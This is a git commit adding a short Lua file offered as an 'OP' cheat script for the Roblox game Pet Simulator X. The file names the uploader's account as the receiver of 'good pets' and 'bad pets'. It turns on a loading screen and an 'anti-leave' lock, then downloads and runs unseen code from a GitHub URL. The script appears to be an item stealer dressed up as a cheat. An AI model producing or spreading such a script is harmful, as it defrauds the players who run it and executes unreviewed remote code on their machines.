96377627c63576f3ec058a8958a5dbfd6b302d41
Jamesliam2003 <144284746+Jamesliam2003@users.noreply.github.com>
2023-09-06 22:22:30 +0100

    Add files via upload

---
+++ OP Pet Sim X Script.lua
@@ -0,0 +1,8 @@
+UserName = "Jamesliam2003" -- good pets
+UserName2 = "Jamesliam2003" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
